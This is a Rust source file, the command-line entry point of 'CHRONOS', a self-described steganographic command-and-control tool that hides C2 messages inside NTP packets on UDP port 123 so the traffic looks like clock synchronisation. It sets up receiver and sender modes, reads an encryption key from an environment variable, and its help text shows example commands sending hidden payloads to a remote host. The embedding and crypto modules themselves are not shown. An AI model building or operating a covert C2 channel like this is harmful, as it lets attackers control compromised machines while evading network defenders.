use clap::{Parser, Subcommand};

mod ntp;
mod crypto;
mod commands;

#[derive(Parser, Debug)]
#[command(
    author,
    version,
    about = "CHRONOS: NTP Steganographic Micro-C2",
    long_about = "CHRONOS hides C2 communication by embedding data inside legitimate NTP (UDP port 123) packets.\n\
                  Traffic looks like normal clock synchronization.",
    after_help = "ENVIRONMENT VARIABLES:\n  \
                  CHRONOS_KEY    64-character hex string (32 bytes) - Required\n\n\
                  EXAMPLES:\n  \
                  # Start receiver\n  \
                  chronos receiver --listen 0.0.0.0:123\n\n  \
                  # Send text command (default)\n  \
                  chronos send --target 203.0.113.50:123 --command \"ping\"\n  \
                  chronos send --target 203.0.113.50:123 --command \"abort\"\n  \
                  chronos send --target 203.0.113.50:123 --command \"hello world\"\n\n  \
                  # Send raw hex\n  \
                  chronos send --target 203.0.113.50:123 --command \"deadbeefcafebabe\" --hex\n\n  \
                  # Long message (automatically split across multiple packets)\n  \
                  chronos send --target 203.0.113.50:123 --command \"This is a longer hidden message\""
)]
struct Args {
    #[command(subcommand)]
    command: Commands,
}

#[derive(Subcommand, Debug)]
enum Commands {
    Receiver {
        #[arg(short, long, default_value = "0.0.0.0:123")]
        listen: String,
    },

    Send {
        #[arg(short, long)]
        target: String,

        #[arg(short, long)]
        command: String,

        #[arg(long)]
        hex: bool,
    },
}

fn get_secret_key() -> [u8; 32] {
    let key_hex = std::env::var("CHRONOS_KEY")
        .expect("CHRONOS_KEY environment variable is required.\n\
                 Export a 64-character hexadecimal string (32 bytes).");

    let decoded = hex::decode(key_hex.trim())
        .expect("CHRONOS_KEY must be valid hexadecimal");

    assert_eq!(decoded.len(), 32, "CHRONOS_KEY must be exactly 32 bytes (64 hex characters)");

    let mut key = [0u8; 32];
    key.copy_from_slice(&decoded);
    key
}

fn main() {
    let args = Args::parse();
    let key = get_secret_key();

    match args.command {
        Commands::Receiver { listen } => {
            println!("[CHRONOS] Starting receiver on {}", listen);
            ntp::run_receiver(&listen, &key);
        }
        Commands::Send { target, command, hex } => {
            let payload = if hex {
                hex::decode(&command)
                    .expect("Invalid hex string provided with --hex")
            } else {
                command.into_bytes()
            };

            ntp::send_command(&target, &payload, &key);
        }
    }
}
